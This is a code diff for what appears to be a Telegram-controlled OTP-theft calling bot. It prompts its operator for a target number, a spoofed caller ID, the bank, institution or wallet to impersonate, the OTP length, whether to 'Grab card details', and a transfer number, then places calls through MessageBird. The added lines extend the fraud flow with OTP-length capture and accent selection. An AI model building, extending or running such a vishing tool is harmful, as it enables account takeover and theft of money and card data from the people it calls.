@@ -1,6 +1,5 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 import { Middleware, Markup } from 'telegraf';
-// import { server } from '../server';
 import { C } from '../types';
 import { UK_NUM, US_NUM } from '../utils/constants';
 import { messagebirdMakeACall } from '../utils/messagebird';
@@ -41,9 +40,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
     }
     await ctx.replyWithHTML(
       `Good,\n\nReply with the ${
-        step === 'account' || step === 'pin'
-          ? 'institution name 🏢'
-          : 'bank name 🏦'
+        step === 'account' ? 'institution name 🏢' : 'bank name 🏦'
       }\n(e.g ${
         /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
           // @ts-expect-error ts doesn't not recognise state
@@ -91,6 +88,21 @@ export const steps = (step: string): Array<Middleware<C>> => [
             );
             return;
           }
+
+          await ctx.replyWithHTML(
+            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
+            Markup.inlineKeyboard([
+              Markup.button.callback('❌ Cancel', 'cancel'),
+            ]),
+          );
+          ctx.wizard.state.callData.callerId = ctx.message.text;
+          return ctx.wizard.next();
+        },
+        async (ctx: any) => {
+          if (!(typeof Number(ctx.message.text) === 'number')) {
+            await ctx.replyWithHTML(`Please enter a number`);
+            return;
+          }
           await ctx.replyWithHTML(
             `Perfect, Reply with the wallet service name \n(e.g ${
               Math.round(Math.random()) ? 'Apple pay' : 'Google pay'
@@ -103,7 +115,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
             ]),
           );
 
-          ctx.wizard.state.callData.callerId = ctx.message.text;
+          ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
           return ctx.wizard.next();
         },
       ]
@@ -166,13 +178,27 @@ export const steps = (step: string): Array<Middleware<C>> => [
             return;
           }
           await ctx.replyWithHTML(
+            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
+            Markup.inlineKeyboard([
+              Markup.button.callback('❌ Cancel', 'cancel'),
+            ]),
+          );
+          ctx.wizard.state.callData.callerId = ctx.message.text;
+          return ctx.wizard.next();
+        },
+        async (ctx: any) => {
+          if (!(typeof Number(ctx.message.text) === 'number')) {
+            await ctx.replyWithHTML(`Please enter a number`);
+            return;
+          }
+          await ctx.replyWithHTML(
             "Grab card 💳 details\n\n<b>***Only click on yes if it's relevant***</b>\n\ne.g you're calling for PayPal OTP, you wouldn't ask card details for a Gmail OTP 🙄",
             Markup.inlineKeyboard([
               Markup.button.callback('Yes', 'yes'),
               Markup.button.callback('No', 'no'),
             ]),
           );
-          ctx.wizard.state.callData.callerId = ctx.message.text;
+          ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
           return ctx.wizard.next();
         },
         async (ctx: any) => {
@@ -194,6 +220,26 @@ export const steps = (step: string): Array<Middleware<C>> => [
         async (ctx: any) => {
           await ctx.reply(
             'Finally,\n\nReply with the number the call will be transfered to 👉🏽',
+            Markup.inlineKeyboard([
+              Markup.button.callback('❌ Cancel', 'cancel'),
+            ]),
+          );
+          ctx.wizard.state.callData.callerId = ctx.message.text;
+          return ctx.wizard.next();
+        },
+      ]
+    : []),
+  ...(step === `bank`
+    ? [
+        async (ctx: any) => {
+          if (!validateNumber(ctx.message.text)) {
+            await ctx.replyWithHTML(
+              `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+            );
+            return;
+          }
+          await ctx.replyWithHTML(
+            `Okay, how long is the OTP.\ne.g 4, 6 etc...`,
             Markup.inlineKeyboard([
               Markup.button.callback('❌ Cancel', 'cancel'),
             ]),
@@ -226,16 +272,30 @@ export const steps = (step: string): Array<Middleware<C>> => [
       ctx.wizard.state.callData.transferNumber = ctx?.message?.text;
     }
 
-    if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
-      // @ts-expect-error ts doesn't not recognise state
-      if (!validateNumber(ctx.message.text)) {
-        await ctx.replyWithHTML(
-          `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
-        );
+    // if (step === 'bank' && !ctx.wizard.state.callData.callerId) {
+    //   // @ts-expect-error ts doesn't not recognise state
+    //   if (!validateNumber(ctx.message.text)) {
+    //     await ctx.replyWithHTML(
+    //       `Please enter a valid\n\n🇺🇸 US\n🇨🇦CA\n🇬🇧UK\n\nnumber\n\nThe number should be in international format withour the + sign\n\ne.g <b>18882019292 or 447418360509</b>`,
+    //     );
+    //     return;
+    //   }
+    //   // @ts-expect-error ts doesn't not recognise state
+    //   ctx.wizard.state.callData.callerId = ctx.message.text;
+    // }
+
+    if (step === `bank` && !ctx.wizard.state.callData.otpLength) {
+      if (
+        ctx.message &&
+        // @ts-expect-error ts doesn't not recognise state
+        !(typeof Number(ctx.message.text) === 'number')
+      ) {
+        await ctx.replyWithHTML(`Please enter a number`);
         return;
       }
+
       // @ts-expect-error ts doesn't not recognise state
-      ctx.wizard.state.callData.callerId = ctx.message.text;
+      ctx.wizard.state.callData.otpLength = Number(ctx.message.text);
     }
 
     const w = ctx.wizard.state.callData.wallet;
@@ -254,6 +314,7 @@ export const steps = (step: string): Array<Middleware<C>> => [
       askCardInfo,
       transferNumber,
       pinType,
+      otpLength,
     } = ctx.wizard.state.callData;
 
     await ctx.replyWithHTML(
@@ -287,6 +348,13 @@ export const steps = (step: string): Array<Middleware<C>> => [
       askCardInfo,
       chatId,
       pinType,
+      otpLength,
+      language:
+        /^(?:(?:\(?(?:0(?:0|11)\)?[\s-]?\(?|)44\)?[\s-]?(?:\(?0\)?[\s-]?)?)|(?:\(?0))(?:(?:\d{5}\)?[\s-]?\d{4,5})|(?:\d{4}\)?[\s-]?(?:\d{5}|\d{3}[\s-]?\d{3}))|(?:\d{3}\)?[\s-]?\d{3}[\s-]?\d{3,4})|(?:\d{2}\)?[\s-]?\d{4}[\s-]?\d{4}))(?:[\s-]?(?:x|ext\.?|#)\d{3,4})?$/g.test(
+          number,
+        )
+          ? `en-us`
+          : `en-gb`,
     });
 
     return ctx.wizard.next();
